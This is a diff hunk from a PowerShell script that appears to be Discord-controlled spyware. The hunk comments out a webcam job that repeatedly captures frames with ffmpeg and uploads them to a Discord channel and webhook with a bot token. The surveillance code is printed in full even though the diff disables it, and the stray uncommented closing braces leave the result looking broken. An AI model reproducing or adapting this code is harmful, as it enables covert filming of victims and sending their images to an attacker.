@@ -1419,31 +1419,31 @@ $screenJob = {
 }
 
 # Scriptblock for webcam screenshots to discord
-$camJob = {
-    param ([string]$token,[string]$WebcamID,[string]$WebcamWebhook)    
-    function sendFile {
-        param([string]$sendfilePath)
-        $url = "https://discord.com/api/v10/channels/$WebcamID/messages"
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("Authorization", "Bot $token")
-        if ($sendfilePath) {
-            if (Test-Path $sendfilePath -PathType Leaf) {
-                $response = $wc.UploadFile($url, "POST", $sendfilePath)
-                if ($WebcamWebhook){
-                    $hooksend = $wc.UploadFile($WebcamWebhook, "POST", $sendfilePath)
+# $camJob = {
+#    param ([string]$token,[string]$WebcamID,[string]$WebcamWebhook)    
+#    function sendFile {
+#        param([string]$sendfilePath)
+#        $url = "https://discord.com/api/v10/channels/$WebcamID/messages"
+#        $wc = New-Object System.Net.WebClient
+#        $wc.Headers.Add("Authorization", "Bot $token")
+#        if ($sendfilePath) {
+#            if (Test-Path $sendfilePath -PathType Leaf) {
+#                $response = $wc.UploadFile($url, "POST", $sendfilePath)
+#                if ($WebcamWebhook){
+#                    $hooksend = $wc.UploadFile($WebcamWebhook, "POST", $sendfilePath)
                 }
             }
         }
     }
-    $imagePath = "$env:Temp\Image.jpg"
-    $Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Camera'} | select -First 1).Name
-    if (!($input)){$Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Image'} | select -First 1).Name}
-    while($true){
-        .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -frames:v 1 -y $imagePath
-        sendFile -sendfilePath $imagePath | Out-Null
-        sleep 5
-        rm -Path $imagePath -Force
-        sleep 5
+#    $imagePath = "$env:Temp\Image.jpg"
+#    $Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Camera'} | select -First 1).Name
+#    if (!($input)){$Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Image'} | select -First 1).Name}
+#    while($true){
+#        .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -frames:v 1 -y $imagePath
+#        sendFile -sendfilePath $imagePath | Out-Null
+#        sleep 5
+#        rm -Path $imagePath -Force
+#        sleep 5
     }
 }
 
